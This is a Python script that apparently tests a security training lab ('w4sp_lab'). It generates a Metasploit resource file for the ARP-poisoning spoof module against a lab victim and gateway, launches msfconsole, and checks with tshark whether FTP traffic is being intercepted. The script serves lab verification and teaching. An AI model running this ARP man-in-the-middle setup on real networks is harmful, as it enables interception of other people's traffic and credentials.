import os
import time
import json
import signal
import requests
import netifaces
import subprocess

from multiprocessing import Process

rc_script = """
use auxiliary/spoof/arp/arp_poisoning
set DHOSTS %s
set SHOSTS %s
set LOCALSIP %s
set BIDIRECTIONAL true
exploit
exit
"""


def psef(grep):
    """this is python replacement for ps -ef, based off of
        http://stackoverflow.com/questions/2703640/process-list-on-linux-via-python"""

    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

    for pid in pids:
        try:

            #read the command line from /proc/<pid>/cmdline
            with open(os.path.join('/proc', pid, 'cmdline'), 'rb') as cmd:
                cmd = cmd.read()
                if grep in cmd:
                    return int(pid), cmd

        #if the proc terminates before we read it
        except IOError:
            continue

    return False




def sniff_ftp():
    """this runs tshark and attempts to see if we get ftp traffic
        as the host machine should not see ftp we assume this means
        that arp mitm is working"""

    ret = False

    #sniff for 120 seconds looking for packets destined for tcp port 21
    cmd = ['tshark', '-i', 'w4sp_lab', '-f', 'dst port ftp', '-c', '10', '-a', 'duration:120', '-Q', '-T', 'json', '-j', 'ftp']
    output = subprocess.check_output(cmd)

    packets = json.loads(output)
    #check if we got 10 packets
    if len(packets) == 10:
        ret = True

    #now kill msfconsole
    pid, cmd = psef('msfconsole')
    print pid
    os.kill(pid, signal.SIGINT)

    return ret



r = requests.get('http://127.0.0.1:5000/getnet')

for node in r.json()['nodes']:
    #find victim 1
    if node['label'] == u'vic1':
        vic_ip = node['title'].split(':')[1].strip().strip(' <br>')


root_ip = netifaces.ifaddresses('w4sp_lab')[2][0]['addr']
dfgw_ip = '192.100.200.1'


with open('arp.rc', 'w+') as rc:
    tmp = rc_script % (vic_ip, dfgw_ip, root_ip)
    rc.write(tmp)


msf = Process(target=subprocess.call, args=(['msfconsole', '-r', 'arp.rc'],))
msf.start()
#give msf 30 seconds to start
time.sleep(30)

if sniff_ftp():
    print('[*] ARP TEST PASSES')

else:
    print('[*] ARP TEST FAILS')



